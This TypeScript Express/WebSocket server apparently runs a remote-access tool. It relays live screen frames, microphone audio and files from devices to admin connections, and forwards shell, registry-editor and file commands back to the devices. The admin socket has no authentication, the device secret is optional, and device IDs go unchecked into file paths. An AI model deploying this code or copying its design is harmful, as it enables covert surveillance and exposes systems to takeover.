import express, { Request, Response } from "express";
import cors from "cors";
import dotenv from "dotenv";
import devicesRouter from "./routes/devices";
import tasksRouter from "./routes/tasks";
import * as path from "path";
import * as http from "http";
import * as url from "url";
import * as fs from "fs";
import * as crypto from "crypto";
import { WebSocketServer, WebSocket } from "ws";
import { query } from "./db";

dotenv.config();

const app = express();
app.use(cors());
app.use(express.json({ limit: "50mb" }));
app.use((err: any, _req: Request, res: Response, _next: any) => {
  res.status(400).json({ error: "invalid json" });
});

app.get("/health", (_req: Request, res: Response) => {
  res.json({ status: "ok" });
});

app.use("/api/devices", devicesRouter);
app.use("/api/tasks", tasksRouter);
app.use("/files", express.static(path.resolve(process.cwd(), "data")));

const server = http.createServer(app);

function kdf(secret: string) {
  return crypto.createHash("sha256").update(secret).digest();
}

function decryptFrame(ciphertextB64: string, ivB64: string, tagB64: string, secret: string) {
  const key = kdf(secret);
  const iv = Buffer.from(ivB64, "base64");
  const tag = Buffer.from(tagB64, "base64");
  const ct = Buffer.from(ciphertextB64, "base64");
  const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
  decipher.setAuthTag(tag);
  const out = Buffer.concat([decipher.update(ct), decipher.final()]);
  return out.toString("base64");
}

function encryptForDevice(plainB64: string, secret: string) {
  const key = kdf(secret);
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
  const ctBuf = Buffer.concat([cipher.update(Buffer.from(plainB64, "base64")), cipher.final()]);
  const tag = cipher.getAuthTag();
  return {
    iv: iv.toString("base64"),
    tag: tag.toString("base64"),
    ciphertext: ctBuf.toString("base64")
  };
}

const deviceConns = new Map<string, { ws: WebSocket; secret: string }>();
const adminSubs = new Map<string, Set<WebSocket>>();
const lastFrames = new Map<string, { b64: string; format: string; ts: string }>();
const fileUploads = new Map<string, { file: string; deviceId: string }>();
const lastAudioTs = new Map<string, number>();
const adminPrefs = new Map<WebSocket, { deviceId: string; types: Set<string> }>();

function sendToAdmins(deviceId: string, type: string, payload: any) {
  const subs = adminSubs.get(deviceId);
  if (!subs || subs.size === 0) return;
  const msg = JSON.stringify({ type, ...payload });
  for (const ws of subs) {
    if (ws.readyState !== WebSocket.OPEN) continue;
    const pref = adminPrefs.get(ws);
    const wants = !pref || pref.deviceId !== deviceId || !pref.types || pref.types.size === 0
      ? true
      : (pref.types.has(type) || (type === "file_saved" && pref.types.has("files")));
    if (wants) {
      try { ws.send(msg); } catch {}
    }
  }
}

function broadcastFrame(deviceId: string, payload: any) {
  sendToAdmins(deviceId, "frame", payload);
}

function broadcastAudio(deviceId: string, payload: any) {
  sendToAdmins(deviceId, "audio", payload);
}

const wss = new WebSocketServer({ server });
const deviceLastSent = new Map<string, number>();
wss.on("connection", (ws: WebSocket, req) => {
  (ws as any).isAlive = true;
  ws.on("pong", () => { (ws as any).isAlive = true; });
  const maxFps = Number(process.env.WS_MAX_FPS || "10");
  const minPeriod = Math.max(1000 / Math.max(1, maxFps), 50);

  const parsed = url.parse(req.url || "", true);
  const pathname = parsed.pathname || "";
  if (pathname === "/ws/device") {
    let deviceId = "";
    let sharedSecret = "";
    ws.on("message", (raw) => {
      let msg: any;
      try {
        msg = JSON.parse(String(raw));
      } catch {
        return;
      }
      if (msg && msg.type === "hello") {
        deviceId = String(msg.deviceId || "");
        sharedSecret = String(msg.secret || "");
        if (!deviceId) {
          ws.close();
          return;
        }
        if (process.env.STREAM_SECRET && sharedSecret !== process.env.STREAM_SECRET) {
          ws.close();
          return;
        }
        deviceConns.set(deviceId, { ws, secret: sharedSecret });
        try { console.log("device hello", deviceId); } catch {}
        try { query("update devices set status = $1 where id = $2", ["online", deviceId]); } catch {}
        try { query("update devices set last_seen = now() where id = $1", [deviceId]); } catch {}
        sendToAdmins(deviceId, "status", { status: "device_connected" });
        return;
      }
      if (msg && msg.type === "frame") {
        if (!deviceId || !sharedSecret) return;
        const { b64, iv, tag, ciphertext, format, ts } = msg;
        const outB64 = b64
          ? String(b64)
          : decryptFrame(String(ciphertext), String(iv), String(tag), sharedSecret);
        const payload = { b64: outB64, format: String(format || "jpeg"), ts: String(ts || new Date().toISOString()) };
        lastFrames.set(deviceId, payload);
        try { query("update devices set last_seen = now() where id = $1", [deviceId]); } catch {}
        const now = Date.now();
        const last = deviceLastSent.get(deviceId) || 0;
        if (now - last >= minPeriod) {
          deviceLastSent.set(deviceId, now);
          broadcastFrame(deviceId, payload);
        }
        try { console.log("frame", deviceId, (outB64?.length || 0)); } catch {}
      }
      if (msg && msg.type === "audio") {
        if (!deviceId || !sharedSecret) return;
        const { b64, iv, tag, ciphertext, sampleRate, channels, ts } = msg;
        const outB64 = b64
          ? String(b64)
          : decryptFrame(String(ciphertext), String(iv), String(tag), sharedSecret);
        const payload = { b64: outB64, sampleRate: Number(sampleRate || 48000), channels: Number(channels || 1), ts: String(ts || new Date().toISOString()) };
        broadcastAudio(deviceId, payload);
        lastAudioTs.set(deviceId, Date.now());
        try { query("update devices set last_seen = now() where id = $1", [deviceId]); } catch {}
        try { console.log("audio", deviceId, (outB64?.length || 0)); } catch {}
      }
      if (msg && msg.type === "file") {
        if (!deviceId) return;
        const name = String(msg.name || "");
        const seq = Number(msg.seq || 0);
        const eof = Boolean(msg.eof);
        const b64 = String(msg.b64 || "");
        if (!name || !/^[a-zA-Z0-9_.-]+$/.test(name)) return;
        const dir = path.resolve(process.cwd(), "data", "devices", deviceId, "files");
        const filePath = path.join(dir, name);
        try { fs.mkdirSync(dir, { recursive: true }); } catch {}
        if (!eof) {
          const buf = Buffer.from(b64 || "", "base64");
          if (seq === 0) {
            try { fs.writeFileSync(filePath, buf); } catch {}
          } else {
            try { fs.appendFileSync(filePath, buf); } catch {}
          }
        } else {
          sendToAdmins(deviceId, "file_saved", { file: name, url: `/files/devices/${deviceId}/files/${name}` });
        }
      }
    });
    ws.on("close", () => {
      if (deviceId) {
        deviceConns.delete(deviceId);
        try { query("update devices set status = $1 where id = $2", ["offline", deviceId]); } catch {}
        try { console.log("device closed", deviceId); } catch {}
        sendToAdmins(deviceId, "status", { status: "device_disconnected" });
      }
    });
    return;
  }
  if (pathname === "/ws/admin") {
    const deviceId = String(parsed.query.deviceId || "");
    if (!deviceId) {
      ws.close();
      return;
    }
    let set = adminSubs.get(deviceId);
    if (!set) {
      set = new Set<WebSocket>();
      adminSubs.set(deviceId, set);
    }
    set.add(ws);
    adminPrefs.set(ws, { deviceId, types: new Set(["frame","audio","status","files"]) });
    const lf = lastFrames.get(deviceId);
    if (lf && ws.readyState === WebSocket.OPEN) {
      ws.send(JSON.stringify({ type: "frame", ...lf }));
    }
    ws.on("message", (raw) => {
      let msg: any;
      try {
        msg = JSON.parse(String(raw));
      } catch {
        return;
      }
      const dev = deviceConns.get(deviceId);
      if (!dev || dev.ws.readyState !== WebSocket.OPEN) return;
      if (msg && msg.type === "subscribe") {
        const list = Array.isArray(msg.listen) ? msg.listen.map((x: any)=>String(x)) : [];
        const allowed = new Set(["frame","audio","status","files","file_saved"]);
        const types = new Set<string>(list.filter((x: string)=>allowed.has(x)));
        adminPrefs.set(ws, { deviceId, types: (types.size>0 ? types : new Set(["frame","audio","status","files"])) });
        return;
      }
      if (msg && msg.type === "file_open_plain") {
        const filename = String(msg.filename || "file.bin");
        const b64 = String(msg.b64 || "");
        dev.ws.send(JSON.stringify({ type: "file_open", filename, b64 }));
        return;
      }
      if (msg && (msg.type === "open_explorer" || msg.type === "open_shell" || msg.type === "open_regedit")) {
        dev.ws.send(JSON.stringify(msg));
        return;
      }
      if (msg && (msg.type === "start_stream" || msg.type === "stop_stream" || msg.type === "open_path")) {
        dev.ws.send(JSON.stringify(msg));
        return;
      }
      if (msg && msg.type === "file_open") {
        dev.ws.send(JSON.stringify(msg));
        return;
      }
      if (msg && msg.type === "file_upload") {
        dev.ws.send(JSON.stringify(msg));
        return;
      }
    });
    ws.on("close", () => {
      set?.delete(ws);
      adminPrefs.delete(ws);
    });
    return;
  }
  ws.close();
});

setInterval(() => {
  wss.clients.forEach((client) => {
    const c: any = client;
    if (c.isAlive === false) {
      try { client.terminate(); } catch {}
      return;
    }
    c.isAlive = false;
    try { client.ping(); } catch {}
  });
}, 30000);

setInterval(async () => {
  try {
    const now = Date.now();
    const staleMs = Number(process.env.DEVICE_STALE_MS || "120000");
    const rows = await query<{ id: string; status: string; last_seen?: string | null }>(
      "select id, status, last_seen from devices order by created_at desc"
    );
    for (const d of rows) {
      const ls = d.last_seen ? Date.parse(d.last_seen) : 0;
      const isStale = !ls || (now - ls > staleMs);
      if (d.status === "online" && isStale) {
        try { await query("update devices set status = $1 where id = $2", ["offline", d.id]); } catch {}
      }
    }
    // prune admin subs sets
    for (const [devId, set] of adminSubs.entries()) {
      const alive = new Set<WebSocket>();
      for (const ws of set) {
        if (ws.readyState === WebSocket.OPEN) alive.add(ws);
      }
      if (alive.size > 0) {
        adminSubs.set(devId, alive);
      } else {
        adminSubs.delete(devId);
      }
    }
    // prune last frames for devices without connection and old frames
    for (const [devId, lf] of lastFrames.entries()) {
      const hasConn = deviceConns.has(devId);
      const ts = lf?.ts ? Date.parse(lf.ts) : 0;
      if (!hasConn && (!ts || now - ts > staleMs)) {
        lastFrames.delete(devId);
      }
    }
  } catch {}
}, 60000);

const port = process.env.PORT ? Number(process.env.PORT) : 8080;
server.listen(port, () => {
  console.log(`server listening on ${port}`);
});
